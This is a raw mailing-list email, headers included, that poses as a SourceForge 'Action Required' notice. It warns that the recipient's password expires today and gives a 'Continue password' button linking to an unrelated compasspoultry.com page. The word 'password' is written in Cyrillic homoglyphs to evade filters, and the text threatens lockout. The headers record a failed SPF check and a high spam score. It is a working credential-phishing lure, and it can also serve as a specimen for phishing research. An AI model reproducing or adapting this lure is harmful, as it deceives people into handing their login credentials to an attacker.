Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 8A1933F1B96
	for <lists+industrypack-devel@lfdr.de>; Thu, 19 Aug 2021 16:28:37 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1mGj24-0004Qu-BP
	for lists+industrypack-devel@lfdr.de; Thu, 19 Aug 2021 14:28:36 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <jorge.gloria@conformachines.com>) id 1mGj1y-0004Py-LB
 for industrypack-devel@lists.sourceforge.net; Thu, 19 Aug 2021 14:28:30 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=lDeeeqmy9/hsbdoZRn9JJQ7yuGpB97UQX72fNH0003g=; b=LxlwVtLwNFzaa5HLeJ/tx/VkX4
 g/Tzd9xL0wLLMf8ceVDbhufQdcHC373mnnwLO5bivyUhwA0FfIgoNdL3SgOilTXcwsm6Dz9eYQPI4
 eXT5YgOpXeF4Bdjq57akyjsliR5U7rTE897GT/FVJ4jofs9MpDaeBZO7JyKwc0QM44SQ=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=lDeeeqmy9/hsbdoZRn9JJQ7yuGpB97UQX72fNH0003g=; b=R
 eZKaVu/w74yA8J2c0T8aVmhNTiz8wngVLw0ZgJ/dXGzM9fjQKq3hX8aok2itrXiOdg2ndx3P+mQ+q
 s5HOuI4zOcWnn9CmNS1EQV4uY5UHuggCfXvM/wxWFpsy/yzh/hCyvKRnOvrmRmNwAsuuWP+pilpLS
 3x0HlusTtpG5lDN4=;
Received: from [165.22.55.158] (helo=mta0.steelsino.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1mGj1v-0003r0-3C
 for industrypack-devel@lists.sourceforge.net; Thu, 19 Aug 2021 14:28:30 +0000
From: lists.sourceforge.net<jorge.gloria@conformachines.com>
To: industrypack-devel@lists.sourceforge.net
Date: 19 Aug 2021 07:08:01 -0700
Message-ID: <20210819070801.F4D05BA0431C1030@conformachines.com>
MIME-Version: 1.0
X-Spam-Score: 6.4 (++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: compasspoultry.com]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.9 SPF_FAIL               SPF: sender does not match SPF record (fail)
 [SPF failed: Please see http://www.openspf.net/Why?s=mfrom;
 id=jorge.gloria%40conformachines.com; ip=165.22.55.158;
 r=util-malware-1.v13.lw.sourceforge.com]
 1.0 HTML_MESSAGE           BODY: HTML included in message
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.0 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 FROM_MISSP_SPF_FAIL    No description available.
 1.2 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML only
X-Headers-End: 1mGj1v-0003r0-3C
Subject: [Industrypack-devel] lists.sourceforge.net Update : Action Required
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============6518945176986214302=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============6518945176986214302==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html>
<head>
	<title></title>
	<meta content=3D"text/html; charset=3Diso-8859-1" http-equiv=3D"Content-Ty=
pe" />
</head>
<body>
<div style=3D"font-size: 13px; font-family: &quot;Google Sans&quot;, Roboto=
, RobotoDraft, Helvetica, Arial, sans-serif; border-bottom: thin solid rgb(=
218, 220, 224); color: rgba(0, 0, 0, 0.87); line-height: 32px; padding-bott=
om: 24px; text-align: center; word-break: break-word;">
<div style=3D"font-size: 24px;">
<p style=3D"font-family: Arial, Helvetica, sans-serif; color: rgb(32, 31, 3=
0); font-size: 15px;"><span style=3D"font-size:20px;"><span style=3D"color:=
#0000FF;">lists.sourceforge.net</span></span></p>

<p style=3D"font-family: Arial, Helvetica, sans-serif; color: rgb(32, 31, 3=
0); font-size: 15px;">&#1088;&#1072;&#1109;&#1109;&#1309;&#1086;r&#1281; fo=
r&nbsp;<font color=3D"#0000f4">industrypack-devel@lists.sourceforge.net</fo=
nt>&nbsp;is due to &#1077;xpir&#1077; 8/19/2021 7:08:01 a.m..</p>

<p style=3D"font-family: Arial, Helvetica, sans-serif; color: rgb(32, 31, 3=
0); font-size: 15px;"><br />
<a href=3D"https://www.compasspoultry.com/ke/hostpointed/#industrypack-deve=
l@lists.sourceforge.net" rel=3D"noopener noreferrer noreferrer" style=3D"co=
lor: white; margin: 0px; padding: 8px; border: 0px; font-style: inherit; fo=
nt-variant: inherit; font-weight: inherit; font-stretch: inherit; line-heig=
ht: inherit; font-family: inherit; vertical-align: baseline; background-col=
or: rgb(42, 126, 251); text-decoration-line: none;" target=3D"_blank">Conti=
nue &#1088;&#1072;&#1109;&#1109;&#1309;&#1086;r&#1281;</a><br />
<span style=3D"margin: 0px; padding: 0px; border: 0px; font: inherit; verti=
cal-align: baseline; color: inherit;">&nbsp;</span></p>

<p style=3D"font-family: Arial, Helvetica, sans-serif; color: rgb(32, 31, 3=
0); font-size: 15px;">Do not ignore this email so you do not get locked out=
 of your account.</p>

<p style=3D"font-family: Arial, Helvetica, sans-serif; color: rgb(32, 31, 3=
0); font-size: 15px;">Thanks</p>

<p style=3D"font-family: Arial, Helvetica, sans-serif; color: rgb(32, 31, 3=
0); font-size: 15px;">lists.sourceforge.net Team</p>

<hr style=3D"font-family: Arial, Helvetica, sans-serif; color: rgb(32, 31, =
30); font-size: 15px;" /></div>
</div>

<div style=3D"font-family: -apple-system, system-ui, &quot;Helvetica Neue&q=
uot;, &quot;Segoe UI&quot;, Arial, sans-serif; padding-top: 20px; font-size=
: 12px; line-height: 16px; color: rgb(95, 99, 104); letter-spacing: 0.3px; =
text-align: center;">&nbsp;</div>
</body>
</html>


--===============6518945176986214302==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6518945176986214302==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============6518945176986214302==--
